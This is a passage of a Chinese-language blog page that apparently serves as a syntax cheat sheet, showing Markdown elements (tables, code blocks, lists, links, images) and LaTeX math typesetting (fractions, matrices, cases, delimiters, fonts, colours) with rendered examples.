</blockquote>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p>两栖动物  </p>
<blockquote>
<p>鳄鱼  </p>
</blockquote>
</blockquote>
</blockquote>
<h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">表格语法：</span><br><span class="line"> 列1 | 列2 | 列3</span><br><span class="line"> --- | --- | --- </span><br><span class="line">第一行|  1  | 2 </span><br><span class="line">第二行|  2  | 3</span><br></pre></td></tr></table></figure>

<blockquote>
<table>
<thead>
<tr>
<th>列1</th>
<th>列2</th>
<th>列3</th>
</tr>
</thead>
<tbody><tr>
<td>第一行</td>
<td>1</td>
<td>2</td>
</tr>
<tr>
<td>第二行</td>
<td>2</td>
<td>3</td>
</tr>
</tbody></table>
</blockquote>
<p>使用冒号(:)来定义对齐方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|左对齐|右对齐|居中|</span><br><span class="line">|:---|---:|:-:|</span><br><span class="line">|一|1|①|</span><br><span class="line">|二|2|②|</span><br></pre></td></tr></table></figure>

<blockquote>
<table>
<thead>
<tr>
<th align="left">左对齐</th>
<th align="right">右对齐</th>
<th align="center">居中</th>
</tr>
</thead>
<tbody><tr>
<td align="left">一</td>
<td align="right">1</td>
<td align="center">①</td>
</tr>
<tr>
<td align="left">二</td>
<td align="right">2</td>
<td align="center">②</td>
</tr>
</tbody></table>
</blockquote>
<p>表格内换行：<code>&lt;br&gt;</code></p>
<h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">代码块使用```[可选语言]开始，```结束，如：</span><br><span class="line">```cs</span><br><span class="line">public class Test</span><br><span class="line">&#123;</span><br><span class="line">    private string _pro;</span><br><span class="line">    public string Pro</span><br><span class="line">    &#123;</span><br><span class="line">        get =&gt; _pro;</span><br><span class="line">        set =&gt; _pro = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>

<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">string</span> _pro;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Pro</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span> =&gt; _pro;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            _pro = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="特别提示"><a href="#特别提示" class="headerlink" title="特别提示"></a>特别提示</h3><p>如何在<code>代码块</code>中打出<code>```</code><br>只要使用4个<code>`</code>包含3个<code>`</code>即可，想表示更多，最外层<code>+1</code>就行。</p>
<h2 id="链接插入"><a href="#链接插入" class="headerlink" title="链接插入"></a>链接插入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[文字](链接)</span><br><span class="line">[首页](https://tao-lol.github.io)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://tao-lol.github.io" target="_blank" rel="noopener">首页</a>  </p>
</blockquote>
<h2 id="图片插入"><a href="#图片插入" class="headerlink" title="图片插入"></a>图片插入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![图片说明](图片链接)</span><br><span class="line">图片链接相对路径或网络地址皆可</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="image-box">
                <img src="https://storebucket1-1258003678.cos.ap-guangzhou.myqcloud.com/Life%20Is%20Strange.jpg" alt="Life Is Strange" title class>
                <p>Life Is Strange</p>
            </figure>  
</blockquote>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*或-或+开头皆可</span><br><span class="line">* 无序列表1</span><br><span class="line">    * 无序列表1-1</span><br><span class="line">- 无序列表2</span><br><span class="line">+ 无序列表3</span><br><span class="line">    + 无序列表3-1</span><br><span class="line">    + 无序列表3-2</span><br><span class="line">        + 无序列表3-2-1</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>无序列表1<ul>
<li>无序列表1-1 <code>多于一级序列一(2?)个空格</code></li>
</ul>
</li>
</ul>
<ul>
<li>无序列表2</li>
</ul>
<ul>
<li>无序列表3<ul>
<li>无序列表3-1</li>
<li>无序列表3-2<ul>
<li>无序列表3-2-1</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">自动生成列表序号，最多两级</span><br><span class="line">1. 有序1</span><br><span class="line">1. 有序2</span><br><span class="line"> 1. 有序2-1</span><br><span class="line">  1. 有序2-1-1</span><br><span class="line"> 1. 有序2-2</span><br><span class="line">1. 有序3</span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li>有序1</li>
<li>有序2<ol>
<li>有序2-1 <code>多于一级序列一(3?)个空格</code><ol>
<li>有序2-1-1</li>
</ol>
</li>
<li>有序2-2</li>
</ol>
</li>
<li>有序3</li>
</ol>
</blockquote>
<h2 id="代办事项"><a href="#代办事项" class="headerlink" title="代办事项"></a>代办事项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- [ ] 未完成事项</span><br><span class="line">- [x] 已完成事项</span><br></pre></td></tr></table></figure>

<p>带 x 的代表已经完成的事项，空格的为还没有完成的事项</p>
<ul>
<li><input disabled type="checkbox"> 未完成事项</li>
<li><input checked disabled type="checkbox"> 已完成事项</li>
</ul>
<h2 id="链接自动检测"><a href="#链接自动检测" class="headerlink" title="链接自动检测"></a>链接自动检测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">百度：http://www.baidu.com/</span><br></pre></td></tr></table></figure>

<blockquote>
<p>百度：<a href="http://www.baidu.com/" target="_blank" rel="noopener">http://www.baidu.com/</a>  </p>
</blockquote>
<h2 id="分隔线"><a href="#分隔线" class="headerlink" title="分隔线"></a>分隔线</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">三个或以上*或-或_</span><br><span class="line">***</span><br><span class="line">---</span><br><span class="line">___</span><br></pre></td></tr></table></figure>

<blockquote>
<hr>
<hr>
<hr>
</blockquote>
<h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不断行空格 &amp;nbsp;</span><br><span class="line">半角空格 &amp;ensp;</span><br><span class="line">全角空格 &amp;emsp;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个&nbsp;是&ensp;例&emsp;子</p>
</blockquote>
<hr>
<h1 id="LaTeX"><a href="#LaTeX" class="headerlink" title="LaTeX"></a>LaTeX</h1><h2 id="插入公式"><a href="#插入公式" class="headerlink" title="插入公式"></a>插入公式</h2><p>LaTeX 的数学公式有两种排版方式：  </p>
<ul>
<li>其一是与文字混排，称为行内公式；  </li>
<li>其二是单独列为一行排版，称为行间公式。  </li>
</ul>
<p>行内公式可以用如下两种方法表示：<code>\(数学公式\)</code>或<code>$数学公式$</code><br>行间公式可以用如下两种方法表示：<code>\[数学公式\]</code>或<code>$$数学公式$$</code>  </p>
<p>例子：<br>行内公式：$\sum_{i=0}^N\int_{a}^{b}g(t,i)\text{d}t$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$\sum_&#123;i=0&#125;^N\int_&#123;a&#125;^&#123;b&#125;g(t,i)\text&#123;d&#125;t$</span><br></pre></td></tr></table></figure>

<p>行间公式：$$\sum_{i=0}^N\int_{a}^{b}g(t,i)\text{d}t$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$\sum_&#123;i=0&#125;^N\int_&#123;a&#125;^&#123;b&#125;g(t,i)\text&#123;d&#125;t$$</span><br></pre></td></tr></table></figure>

<h2 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h2><ul>
<li><p>在 $\LaTeX$ 中用<code>^</code>和<code>_</code>标明上下标。注意上下标的内容（子公式）一般需要用花括号<code>{}</code>包裹，否则上下标只对后面的一个符号起作用。<br>$$x_{a}^{b}$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$x_&#123;a&#125;^&#123;b&#125;$$</span><br></pre></td></tr></table></figure>
</li>
<li><p>分式使用<code>\frac{分子}{分母}</code>来书写。分式的大小在行间公式中是正常大小，而在行内被极度压缩。<br>$$\frac{b}{a}$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$\frac&#123;b&#125;&#123;a&#125;$$</span><br></pre></td></tr></table></figure>
</li>
<li><p>一般的根号使用<code>\sqrt{...}</code>；表示 n 次方根时写成<code>\sqrt[n]{...}</code>。<br>$$\sqrt{2} \qquad \sqrt[n]{a}$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$\sqrt&#123;2&#125;$</span><br><span class="line">$\sqrt[n]&#123;a&#125;$</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<ul>
<li><p>函数： <code>\函数名</code><br><code>\sin x</code>$\sin x$，<code>\ln x</code>$\ln x$，<code>\log_n^2 5</code>$\log_n^2 5$，<code>\max(A,B,C)</code>$\max(A,B,C)$，<code>\pmod a</code>$\pmod a$，<code>\bmod a</code>$\bmod a$</p>
</li>
<li><p>矢量： <code>\vec{...}</code><br>$$\vec{a} \cdot \vec{b}=0$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$\vec&#123;a&#125; \cdot \vec&#123;b&#125;=0$$</span><br></pre></td></tr></table></figure>
</li>
<li><p>极限： <code>\lim</code><br>$$\lim_{n \rightarrow +\infty} \frac{1}{n(n+1)}$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$\lim_&#123;n \rightarrow +\infty&#125; \frac&#123;1&#125;&#123;n(n+1)&#125;$$</span><br></pre></td></tr></table></figure>
</li>
<li><p>求和： <code>\sum</code><br>$$\sum_{i=0}^n \frac{1}{i^2}$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$\sum_&#123;i=0&#125;^n \frac&#123;1&#125;&#123;i^2&#125;$$</span><br></pre></td></tr></table></figure>
</li>
<li><p>积分 <code>\int</code>$\int$，<code>\iint</code>$\iint$，<code>\iiint</code>$\iiint$，<code>\oint</code>$\oint$<br>$$\int_0^\infty{fxdx}$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$\int_0^\infty&#123;fxdx&#125;$$</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<p>矩阵：</p>
<ul>
<li>需要 matrix 环境，起始标记：<code>\begin{matrix}</code>，结束标记：<code>\end{matrix}</code></li>
<li>每一行末尾标记<code>\\</code>，行间元素之间以<code>&amp;</code>分隔<br>$$\begin{matrix} 1&amp;0&amp;0 \\ 0&amp;1&amp;0 \\ 0&amp;0&amp;1 \\ \end{matrix}$$<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$\begin&#123;matrix&#125; 1&amp;0&amp;0 \\ 0&amp;1&amp;0 \\ 0&amp;0&amp;1 \\ \end&#123;matrix&#125;$$</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>矩阵边框：</p>
<ul>
<li>在起始、结束标记处用下列词替换 <code>matrix</code></li>
</ul>
<table>
<thead>
<tr>
<th>类型</th>
<th>命令</th>
<th>矩阵边框显示效果</th>
</tr>
</thead>
<tbody><tr>
<td>小括号边框</td>
<td>pmatrix</td>
<td>$$\begin{pmatrix} 1&amp;0&amp;0 \\ 0&amp;1&amp;0 \\ 0&amp;0&amp;1 \\ \end{pmatrix}$$</td>
</tr>
<tr>
<td>中括号边框</td>
<td>bmatrix</td>
<td>$$\begin{bmatrix} 1&amp;0&amp;0 \\ 0&amp;1&amp;0 \\ 0&amp;0&amp;1 \\ \end{bmatrix}$$</td>
</tr>
<tr>
<td>大括号边框</td>
<td>Bmatrix</td>
<td>$$\begin{Bmatrix} 1&amp;0&amp;0 \\ 0&amp;1&amp;0 \\ 0&amp;0&amp;1 \\ \end{Bmatrix}$$</td>
</tr>
<tr>
<td>单竖线边框</td>
<td>vmatrix</td>
<td>$$\begin{vmatrix} 1&amp;0&amp;0 \\ 0&amp;1&amp;0 \\ 0&amp;0&amp;1 \\ \end{vmatrix}$$</td>
</tr>
<tr>
<td>双竖线边框</td>
<td>Vmatrix</td>
<td>$$\begin{Vmatrix} 1&amp;0&amp;0 \\ 0&amp;1&amp;0 \\ 0&amp;0&amp;1 \\ \end{Vmatrix}$$</td>
</tr>
</tbody></table>
<hr>
<p>阵列：</p>
<ul>
<li>需要 array 环境：起始、结束处以<code>{array}</code>声明</li>
<li>对齐方式：在<code>{array}</code>后以<code>{}</code>逐行统一声明</li>
<li>左对齐：<code>l</code>；居中：<code>c</code>；右对齐：<code>r</code></li>
<li>竖直线：在声明对齐方式时，插入<code>|</code>建立竖直线</li>
<li>插入水平线：<code>\hline</code><br>$$\begin{array}{c|lll} {↓}&amp;{a}&amp;{b}&amp;{c} \\ \hline {R_1}&amp;{c}&amp;{b}&amp;{a} \\ {R_2}&amp;{b}&amp;{c}&amp;{c} \\ \end{array}$$<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$\begin&#123;array&#125;&#123;c|lll&#125; &#123;↓&#125;&amp;&#123;a&#125;&amp;&#123;b&#125;&amp;&#123;c&#125; \\ \hline &#123;R_1&#125;&amp;&#123;c&#125;&amp;&#123;b&#125;&amp;&#123;a&#125; \\ &#123;R_2&#125;&amp;&#123;b&#125;&amp;&#123;c&#125;&amp;&#123;c&#125; \\ \end&#123;array&#125;$$</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<p>方程组：</p>
<ul>
<li>需要 cases 环境：起始、结束处以<code>{cases}</code>声明<br>$$f(n) = \begin{cases} n/2, &amp; \text{if $n$ is even} \\ 3n+1, &amp; \text{if $n$ is odd} \end{cases}$$<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$f(n) = \begin&#123;cases&#125; n/2, &amp; \text&#123;if $n$ is even&#125; \\ 3n+1, &amp; \text&#123;if $n$ is odd&#125; \end&#123;cases&#125;$$</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<ul>
<li><p>上划线 <code>\overline{...}</code>；下划线 <code>\underline{...}</code>。<br>$$0.\overline{3} = \underline{\underline{1/3}}$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$0.\overline&#123;3&#125; = \underline&#123;\underline&#123;1/3&#125;&#125;$$</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>\overbrace</code> 和 <code>\underbrace</code> 命令用来生成上/下括号，各自可带一个上/下标公式。<br>$$\underbrace{\overbrace{(a+b+c)}^6 \cdot \overbrace{(d+e+f)}^7}_\text{meaning of line} = 42$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$\underbrace&#123;\overbrace&#123;(a+b+c)&#125;^6 \cdot \overbrace&#123;(d+e+f)&#125;^7&#125;_\text&#123;meaning of line&#125; = 42$$</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<p>&emsp;&emsp;$\LaTeX$ 提供了多种括号和定界符表示公式块的边界，如小括号 ()、中括号 []、大括号 {}（<code>\{</code> <code>\}</code>）、尖括号 ⟨⟩（<code>\langle</code> <code>\rangle</code>）等。<br>$${a,b,c} \neq \{a,b,c\}$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$&#123;a,b,c&#125; \neq \&#123;a,b,c\&#125;$$</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;使用<code>\left</code>和<code>\right</code>命令可令括号（定界符）的大小可变，在行间公式中常用。$\LaTeX$ 会自动根据括号内的公式大小决定定界符大小。<code>\left</code>和<code>\right</code>必须成对使用。需要使用单个定界符时，另一个定界符写成<code>\left.</code>或<code>\right.</code>。<br>\[1 + \left(\frac{1}{1-x^{2}} \right)^3 \qquad \left.\frac{\partial f}{\partial t} \right|_{t=0}\]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\[1 + \left(\frac&#123;1&#125;&#123;1-x^&#123;2&#125;&#125; \right)^3 \qquad \left.\frac&#123;\partial f&#125;&#123;\partial t&#125; \right|_&#123;t=0&#125;\]</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;有时我们不满意于 $\LaTeX$ 为我们自动调节的定界符大小。这时我们还可以用<code>\big</code>、<code>\bigg</code>等命令生成固定大小的定界符。更常用的形式是类似<code>\left</code>的<code>\bigl</code>、<code>\biggl</code>等，以及类似<code>\right</code>的<code>\bigr</code>、<code>\biggr</code>等（<code>\bigl</code>和<code>\bigr</code>不必成对出现）。<br>$$\Bigl((x+1)(x-1)\Bigr)^{2} \\ \bigl( \Bigl( \biggl( \Biggl( \quad \bigr\} \Bigr\} \biggr\} \Biggr\} \quad \big| \Big| \bigg| \Bigg| \quad \big\Downarrow \Big\Downarrow \bigg\Downarrow \Bigg\Downarrow$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$\Bigl((x+1)(x-1)\Bigr)^&#123;2&#125;$\\ $\bigl( \Bigl( \biggl( \Biggl( \quad \bigr\&#125; \Bigr\&#125; \biggr\&#125; \Biggr\&#125; \quad \big\| \Big\| \bigg\| \Bigg\| \quad \big\Downarrow \Big\Downarrow \bigg\Downarrow \Bigg\Downarrow$</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;使用<code>\big</code>和<code>\bigg</code>等命令的另外一个好处是：用<code>\left</code>和<code>\right</code>分界符包裹的公式块是不允许断行的，所以也不允许在多行公式里跨行使用，而<code>\big</code>和<code>\bigg</code>等命令不受限制。</p>
<hr>
<p>&emsp;&emsp;积分号 ∫（<code>\int</code>）、求和号 ∑（<code>\sum</code>）等符号称为巨算符。巨算符在行内公式和行间公式的大 小和形状有区别。<br>&emsp;&emsp;巨算符的上下标位置可由<code>\limits</code>和<code>\nolimits</code>控制，前者令巨算符类似 lim 或求和算符 ∑，上下标位于上下方；后者令巨算符类似积分号，上下标位于右上方和右下方。</p>
<hr>
<p>&emsp;&emsp;数学模式中输入的空格被忽略。数学符号的间距默认由符号的性质（关系符号、运算符等）决定。需要人为引入间距时，使用<code>\空格</code>（1 格空格），<code>\quad</code>（4 格空格）和<code>\qquad</code>等命令。<br>&emsp;&emsp;通常来讲应当避免写出超过一行而需要折行的长公式。如果一定要折行的话，习惯上优先在等号之前折行，其次在加号、减号之前，再次在乘号、除号之前。其它位置应当避免折行。<br>&emsp;&emsp;用 <code>\\</code> 折行，将公式编号放在最后一行。多行公式的首行左对齐，末行右对齐，其余行居中。</p>
<hr>
<p>&emsp;&emsp;有时候可能需要一系列的公式中等号对齐，如：<br>$$\begin{align} \sqrt{37} &amp; = \sqrt{\frac{73^2-1}{12^2}} \\ &amp; = \sqrt{\frac{73^2}{12^2} \cdot \frac{73^2-1}{73^2}} \\ &amp; = \frac{73}{12} \sqrt{1 - \frac{1}{73^2}} \\ &amp; \approx \frac{73}{12} \left( 1 - \frac{1}{2 \cdot 73^2} \right) \end{align}$$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$\begin&#123;align&#125; \sqrt&#123;37&#125; &amp; = \sqrt&#123;\frac&#123;73^2-1&#125;&#123;12^2&#125;&#125; \\ &amp; = \sqrt&#123;\frac&#123;73^2&#125;&#123;12^2&#125; \cdot \frac&#123;73^2-1&#125;&#123;73^2&#125;&#125; \\ &amp; = \frac&#123;73&#125;&#123;12&#125; \sqrt&#123;1 - \frac&#123;1&#125;&#123;73^2&#125;&#125; \\ &amp; \approx \frac&#123;73&#125;&#123;12&#125; \left( 1 - \frac&#123;1&#125;&#123;2 \cdot 73^2&#125; \right) \end&#123;align&#125;$$</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时候需要使用形如<code>\begin{align}...\end{align}</code>的格式，其中需要使用<code>&amp;</code>来指示需要对齐的位置。<br>&emsp;&emsp;align 环境会给每行公式都编号。在单个式子末尾加上<code>\tag{...}</code>命令可以手动修改公式的编号，或者在每个式子末尾加上<code>\notag</code>或<code>\nonumber</code>可以去掉某行的编号。<br>&emsp;&emsp;align 环境还能够对齐多组公式，除等号前的 &amp; 之外，公式之间也用 &amp; 分隔。</p>
<hr>
<p>&emsp;&emsp;LATEX 将数学函数的名称作为一个算符排版，字体为直立字体。其中有一部分符号在上下位置可以书写一些内容作为条件，类似于后文所叙述的巨算符。  </p>
<p>不带上下限的算符：</p>
<table>
<thead>
<tr>
<th>不带</th>
<th>上下</th>
<th>限</th>
<th>的</th>
<th>算符</th>
</tr>
</thead>
<tbody><tr>
<td>\sin</td>
<td>\arcsin</td>
<td>\sinh</td>
<td>\exp</td>
<td>\dim</td>
</tr>
<tr>
<td>\cos</td>
<td>\arccos</td>
<td>\cosh</td>
<td>\log</td>
<td>\ker</td>
</tr>
<tr>
<td>\tan</td>
<td>\arctan</td>
<td>\tanh</td>
<td>\lg</td>
<td>hom</td>
</tr>
<tr>
<td>\cot</td>
<td>\arg</td>
<td>\coth</td>
<td>\ln</td>
<td>\deg</td>
</tr>
<tr>
<td>\sec</td>
<td>\csc</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>带上下限的算符：</p>
<table>
<thead>
<tr>
<th>带</th>
<th>上下</th>
<th>限</th>
<th>的</th>
<th>算符</th>
</tr>
</thead>
<tbody><tr>
<td>\lim</td>
<td>\limsup</td>
<td>\liminf</td>
<td>\sup</td>
<td>\inf</td>
</tr>
<tr>
<td>\min</td>
<td>\max</td>
<td>\det</td>
<td>\Pr</td>
<td>\gcd</td>
</tr>
</tbody></table>
<h3 id="字体、字号和颜色"><a href="#字体、字号和颜色" class="headerlink" title="字体、字号和颜色"></a>字体、字号和颜色</h3><h4 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>$\mathrm{ABCDEabcde1234}$</td>
<td>\mathrm{…}</td>
<td></td>
</tr>
<tr>
<td>$\mathit{ABCDEabcde1234}$</td>
<td>\mathit{…}</td>
<td></td>
</tr>
<tr>
<td>$\mathbf{ABCDEabcde1234}$</td>
<td>\mathbf{…}</td>
<td></td>
</tr>
<tr>
<td>$\mathsf{ABCDEabcde1234}$</td>
<td>\mathsf{…}</td>
<td></td>
</tr>
<tr>
<td>$\mathtt{ABCDEabcde1234}$</td>
<td>\mathtt{…}</td>
<td></td>
</tr>
<tr>
<td>$\mathcal{ABCDE}$</td>
<td>\mathcal{…}</td>
<td>只大写字母</td>
</tr>
<tr>
<td>$\mathscr{ABCDE}$</td>
<td>\mathscr{…}</td>
<td>只大写字母</td>
</tr>
<tr>
<td>$\mathfrak{ABCDEabcde1234}$</td>
<td>\mathfrak{…}</td>
<td></td>
</tr>
<tr>
<td>$\mathbb{ABCDE}$</td>
<td>\mathbb{…}</td>
<td>只大写字母</td>
</tr>
</tbody></table>
<h4 id="字号"><a href="#字号" class="headerlink" title="字号"></a>字号</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\tiny{ABCDEabcde1234}$</td>
<td>\tiny{…}</td>
</tr>
<tr>
<td>$\scriptsize{ABCDEabcde1234}$</td>
<td>\scriptsize{…}</td>
</tr>
<tr>
<td>$\small{ABCDEabcde1234}$</td>
<td>\small{…}</td>
</tr>
<tr>
<td>$\normalsize{ABCDEabcde1234}$</td>
<td>\normalsize{…}</td>
</tr>
<tr>
<td>$\large{ABCDEabcde1234}$</td>
<td>\large{…}</td>
</tr>
<tr>
<td>$\Large{ABCDEabcde1234}$</td>
<td>\Large{…}</td>
</tr>
<tr>
<td>$\LARGE{ABCDEabcde1234}$</td>
<td>\LARGE{…}</td>
</tr>
<tr>
<td>$\huge{ABCDEabcde1234}$</td>
<td>\huge{…}</td>
</tr>
<tr>
<td>$\Huge{ABCDEabcde1234}$</td>
<td>\Huge{…}</td>
</tr>
</tbody></table>
<h4 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h4><table>
<thead>
<tr>
<th>颜色</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>black</td>
<td>${\color{black} {黑色}}$</td>
<td>{\color{black} {黑色}}</td>
</tr>
<tr>
<td>red</td>
<td>${\color{red} {红色}}$</td>
<td>{\color{red} {红色}}</td>
</tr>
<tr>
<td>green</td>
<td>${\color{green} {绿色}}$</td>
<td>{\color{green} {绿色}}</td>
</tr>
<tr>
<td>blue</td>
<td>${\color{blue} {蓝色}}$</td>
<td>{\color{blue} {蓝色}}</td>
</tr>
<tr>
<td>white</td>
<td>${\color{white} {白色}}$</td>
<td>{\color{white} {白色}}</td>
</tr>
<tr>
<td>cyan</td>
<td>${\color{cyan} {青色}}$</td>
<td>{\color{cyan} {青色}}</td>
</tr>
<tr>
<td>magenta</td>
<td>${\color{magenta} {洋红色}}$</td>
<td>{\color{magenta} {洋红色}}</td>
</tr>
<tr>
<td>yellow</td>
<td>${\color{yellow} {黄色}}$</td>
<td>{\color{yellow} {黄色}}</td>
</tr>
<tr>
<td>darkgray</td>
<td>${\color{darkgray} {深灰色}}$</td>
<td>{\color{darkgray} {深灰色}}</td>
</tr>
<tr>
<td>gray</td>
<td>${\color{gray} {灰色}}$</td>
<td>{\color{gray} {灰色}}</td>
</tr>
<tr>
<td>lightgray</td>
<td>${\color{lightgray} {浅灰色}}$</td>
<td>{\color{lightgray} {浅灰色}}</td>
</tr>
<tr>
<td>brown</td>
<td>${\color{brown} {棕色}}$</td>
<td>{\color{brown} {棕色}}</td>
</tr>
<tr>
<td>olive</td>
<td>${\color{olive} {橄榄绿}}$</td>
<td>{\color{olive} {橄榄绿}}</td>
</tr>
<tr>
<td>orange</td>
<td>${\color{orange} {橙色}}$</td>
<td>{\color{orange} {橙色}}</td>
</tr>
<tr>
<td>lime</td>
<td>${\color{lime} {黄绿色}}$</td>
<td>{\color{lime} {黄绿色}}</td>
</tr>
<tr>
<td>purple</td>
<td>${\color{purple} {紫色}}$</td>
<td>{\color{purple} {紫色}}</td>
</tr>
<tr>
<td>teal</td>
<td>${\color{teal} {蓝绿色}}$</td>
<td>{\color{teal} {蓝绿色}}</td>
</tr>
<tr>
<td>violet</td>
<td>${\color{violet} {紫罗兰色}}$</td>
<td>{\color{violet} {紫罗兰色}}</td>
</tr>
<tr>
<td>pink</td>
<td>${\color{pink} {粉色}}$</td>
<td>{\color{pink} {粉色}}</td>
</tr>
</tbody></table>
